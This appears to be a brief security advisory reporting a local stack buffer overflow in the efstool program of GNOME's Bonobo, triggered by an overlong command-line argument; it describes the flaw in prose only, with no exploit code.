Bonobo is a set of tools and CORBA interfaces included as part of the Gnome infrastructure. It is designed for use on the Linux and Unix operating systems.

A boundry condition error has been discovered in the efstool program. Due to improper bounds checking, it is possible for a user to supply a long commandline argument to the efstool program, which would result in a buffer overflow. This problem could be exploited on the local system to overwrite stack memory, including the return address, and execute attacker supplied code.
